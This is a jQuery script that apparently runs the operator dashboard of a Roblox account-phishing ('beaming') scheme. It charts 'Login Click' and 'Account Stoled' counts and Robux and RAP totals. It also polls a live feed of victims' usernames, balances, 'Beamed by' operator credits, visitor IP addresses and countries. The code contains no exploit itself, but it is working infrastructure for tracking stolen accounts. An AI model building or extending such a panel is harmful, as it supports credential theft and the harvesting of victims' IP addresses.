(function ($) {
    "use strict";

    // Spinner
    var spinner = function () {
        setTimeout(function () {
            if ($('#spinner').length > 0) {
                $('#spinner').removeClass('show');
            }
        }, 1);
    };
    spinner();
    
    
    // Back to top button
    $(window).scroll(function () {
        if ($(this).scrollTop() > 300) {
            $('.back-to-top').fadeIn('slow');
        } else {
            $('.back-to-top').fadeOut('slow');
        }
    });
    $('.back-to-top').click(function () {
        $('html, body').animate({scrollTop: 0}, 1500, 'easeInOutExpo');
        return false;
    });


    // Sidebar Toggler
    $('.sidebar-toggler').click(function () {
        $('.sidebar, .content').toggleClass("open");
        return false;
    });


    // Progress Bar
    $('.pg-bar').waypoint(function () {
        $('.progress .progress-bar').each(function () {
            $(this).css("width", $(this).attr("aria-valuenow") + '%');
        });
    }, {offset: '80%'});


    // Calender
    $('#calender').datetimepicker({
        inline: true,
        format: 'L'
    });


    // Testimonials carousel
    $(".testimonial-carousel").owlCarousel({
        autoplay: true,
        smartSpeed: 1000,
        items: 1,
        dots: true,
        loop: true,
        nav : false
    });


    // Chart Global Color
    Chart.defaults.color = "#6C7293";
    Chart.defaults.borderColor = "#000000";

if(location.pathname == "/controlPage/dashboard"){
    $.ajax({
        url: `/controlPage/apis/chart?type=robuxrap`,
        dataType: 'json',
        success: function(data){
			var ctx1 = $("#robux-rap").get(0).getContext("2d");
			var myChart1 = new Chart(ctx1, {
				type: "bar",
				data: {
					labels: data['labels'],
					datasets: [{
							label: "Robux",
							data: data['robux'],
							backgroundColor: "rgba(235, 22, 22, .7)"
						},
						{
							label: "RAP",
							data: data['rap'],
							backgroundColor: "rgba(235, 22, 22, .5)"
						}
					]
					},
				options: {
					responsive: true
				}
			});
		}
	});


	$.ajax({
        url: `/controlPage/apis/chart?type=visitorlogin`,
        dataType: 'json',
        success: function(data){
			var ctx2 = $("#visitor-login").get(0).getContext("2d");
			var myChart2 = new Chart(ctx2, {
				type: "line",
				data: {
					labels: data['labels'],
					datasets: [{
							label: "Visitor's",
							data: data['visitor'],
							backgroundColor: "rgba(235, 22, 22, .7)",
							fill: true
						},
						{
							label: "Login Click",
							data: data['login'],
							backgroundColor: "rgba(235, 22, 22, .5)",
							fill: true
						},
						{
							label: "Account Stoled",
							data: data['account'],
							backgroundColor: "rgba(235, 22, 22, .5)",
							fill: true
						}
					]
					},
				options: {
					responsive: true
				}
			});
		}
	});

    function live(a){
        $.ajax({
            url: `/controlPage/apis/live?user_id=${a}`,
            dataType: 'json',
			failed: function(){
				setTimeout(function(){
                    live(document.querySelector("#unique").value);
                }, 1500)
			},
            success: function(data){
				if(document.getElementById("live-username-0").innerHTML !== data['data'][0].split("|")[0]){
					var i;
					for(i = 0; i <= data['data'].length - 1; i++){
						var dataApi = data['data'][i].split("|");
						var dataFormat = `Robux: ${dataApi[2]} | Summary: ${dataApi[5]} | RAP: ${dataApi[1]} <br> Beamed by <img class="rounded-circle" src="${dataApi[7]}" style="width: 21px; height: 21px;"> ${dataApi[6]}`;
						document.getElementById("live-image-" + i).src = dataApi[4];
						document.getElementById("live-username-" + i).innerHTML = dataApi[0];
						document.getElementById("live-time-" + i).innerHTML = dataApi[3];
						document.getElementById("live-data-" + i).innerHTML = dataFormat;
						if	(i == 0){
							document.getElementById("live-data-0").parentElement.parentElement.classList.add("pop-up");
							setTimeout(() => {
								document.getElementById("live-data-0").parentElement.parentElement.classList.remove("pop-up");
							}, 400);
						}
						if	(i == 6){
							document.getElementById("live-data-6").parentElement.parentElement.classList.add("pop-down");
							setTimeout(() => {
								document.getElementById("live-data-6").parentElement.parentElement.classList.remove("pop-down");
							}, 400);
						}
					}
					for(i = 0; i <= data['data_visitor'].length - 1; i++){
						var dataVisitor = data['data_visitor'][i].split("|");
							document.getElementById("visitor-flag-" + i).innerHTML = dataVisitor[1];
							document.getElementById("visitor-ip-" + i).innerHTML = dataVisitor[2];
							document.getElementById("visitor-date-" + i).innerHTML = dataVisitor[0];
							document.getElementById("visitor-data-" + i).innerHTML = dataVisitor[3];
					}
				}
                setTimeout(function(){
                    live(document.querySelector("#unique").value);
                }, 1500)
            }
        });
    };
    live(document.querySelector("#unique").value);
}
    
})(jQuery);

